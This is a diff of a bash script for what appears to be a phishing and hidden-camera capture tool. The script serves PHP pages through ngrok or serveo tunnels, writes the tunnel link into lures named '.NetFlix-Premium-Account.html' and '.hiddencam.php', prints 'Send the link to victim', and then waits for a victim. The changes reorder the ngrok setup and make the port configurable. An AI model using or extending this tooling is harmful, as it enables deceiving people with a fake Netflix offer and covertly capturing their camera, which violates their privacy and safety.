@@ -108,13 +108,6 @@ done
 
 }
 
-initialize_ngrok() {
-
-ngroklink=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
-sed 's+forwarding_link+'$ngroklink'+g' .tahmidrayat.iso > .NetFlix-Premium-Account.html
-sed 's+forwarding_link+'$ngroklink'+g' .hiddencam.php > index.php
-
-}
 start_ngrok() {
 
 if [[ -e ngrok ]]; then
@@ -154,12 +147,23 @@ printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Launching Ngrok ..\e
 php -S 127.0.0.1:5555 > /dev/null 2>&1 & 
 sleep 2
 ./ngrok http 5555 > /dev/null 2>&1 &
-sleep 10
+sleep 8
 link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
+banner
+printf "\e[0m\n"
+printf "\e[0m\n"
 printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;96m Send the link to victim :\e[0m\e[1;93m %s \n" $link
 
 initialize_ngrok
 victimfound
+}
+
+initialize_ngrok() {
+
+ngroklink=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
+sed 's+forwarding_link+'$ngroklink'+g' .tahmidrayat.iso > .NetFlix-Premium-Account.html
+sed 's+forwarding_link+'$ngroklink'+g' .hiddencam.php > index.php
+
 }
 
 start_serveo() {
@@ -195,18 +199,18 @@ printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Initializing...\e[0m
 
 if [[ $subdomain_resp == true ]]; then
 
-$(which sh) -c 'ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R '$subdomain':80:localhost:5555 serveo.net  2> /dev/null > .servlink ' &
+$(which sh) -c 'ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R '$subdomain':80:localhost:$port serveo.net  2> /dev/null > .servlink ' &
 
 sleep 8
 else
-$(which sh) -c 'ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R 80:localhost:5555 serveo.net 2> /dev/null > .servlink ' &
+$(which sh) -c 'ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R 80:localhost:$port serveo.net 2> /dev/null > .servlink ' &
 
 sleep 8
 fi
 printf "\e[0m\n"
 printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Launching Serveo ..\e[0m\n"
-fuser -k 5555/tcp > /dev/null 2>&1
-php -S localhost:5555 > /dev/null 2>&1 &
+fuser -k $port/tcp > /dev/null 2>&1
+php -S localhost:$port > /dev/null 2>&1 &
 sleep 3
 serv_link=$(grep -o "https://[0-9a-z]*\.serveo.net" .servlink)
 printf "\e[0m\n"
